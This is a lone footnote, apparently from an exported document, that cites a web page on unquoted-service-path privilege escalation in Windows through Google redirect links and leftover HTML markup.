[[15]](#ftnt_ref15)<span class="c35"> </span><span class="c21">[https://gracefulsecurity.com/privesc-unquoted-service-path](https://www.google.com/url?q=https://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653835189709215&usg=AOvVaw0m2gjhTfQSLyI9ivLAHzLT)</span><span class="c52">[/](https://www.google.com/url?q=https://gracefulsecurity.com/privesc-unquoted-service-path/&sa=D&source=editors&ust=1653835189709382&usg=AOvVaw1Go8n6284irZh1Lndond5k)</span>

</div>
